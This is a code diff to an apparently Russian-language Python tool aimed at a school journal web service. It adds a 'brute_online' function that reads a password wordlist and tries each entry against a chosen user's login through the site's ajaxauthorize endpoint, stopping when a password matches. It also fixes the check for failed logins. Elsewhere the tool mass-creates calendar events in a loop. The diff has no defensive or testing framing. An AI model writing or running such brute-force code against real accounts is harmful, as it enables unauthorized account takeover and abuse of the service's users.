@@ -56,8 +56,7 @@ def reg(login_val, password_val):
     }
     try:
         response = session.post(f"{BASE}/ajaxauthorize", data=data)
-        if response.json == {'actions': [], 'errors': [{'field': None, 'text': 'Неверный логин или пароль'}],
-                             'result': False}:
+        if response.text == r"""{"actions":[],"errors":[{"field":null,"text":"\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u043b\u043e\u0433\u0438\u043d \u0438\u043b\u0438 \u043f\u0430\u0440\u043e\u043b\u044c"}],"result":false}""":
             return "Неверный логин или пароль"
         elif r""""result":true""" in str(response.text):
             domain = json.loads(str(json.loads(str(response.text))["actions"]).replace("[", "").replace("]", "").replace("'", '"'))["url"].replace(f"/?user={login_val}&domain=", "")
@@ -154,6 +153,7 @@ def menu():
             calendar_go()
         elif go == "4":
             os.system('cls' if os.name == 'nt' else 'clear')
+            brute_online()
             break
         elif go == "99":
             os.system('cls' if os.name == 'nt' else 'clear')
@@ -235,6 +235,32 @@ def calendar_go():
     while g <= N:
         print(f"Созданно событие {g}:\n{newcal(title=title, canEdit=True if canEdit == "да" else False, description=description, calendar_id=calendar_id, datetime_start=date_start, datetime_end=date_end, presence=presence, place_type=place_type, place_value=place_value, status=status)}\n")
         g += 1
+    print("Готово!")
+    time.sleep(2)
+    os.system('cls' if os.name == 'nt' else 'clear')
+    menu()
+
+def brute_online():
+    gg_stabilizator = False
+    print(logo)
+    print("\n                  Вы выбрали brute online\n")
+    login = input("login>>  ")
+    brute_file = input("brute_file>>  ")
+    N = 0
+    get_soup(f"{BASE}/journal-user-logout-action")
+    with open(brute_file, "r", encoding='utf-8') as f:
+        for line in f:
+            pp = reg(login, line.strip())
+            if pp == "ok":
+                print(f"СОВПАДЕНИЕ НАЙДЕННО: {login}, {line.strip()}\n Нажмите enter")
+                input()
+                gg_stabilizator = True
+                break
+            elif pp == "Неверный логин или пароль":
+                print(f"{N})Неподходит:   {login}, {line.strip()}")
+            N += 1
+        if gg_stabilizator == False:
+            print(f"Нету подходящих паролей к {login}")
     print("Готово!")
     time.sleep(2)
     os.system('cls' if os.name == 'nt' else 'clear')
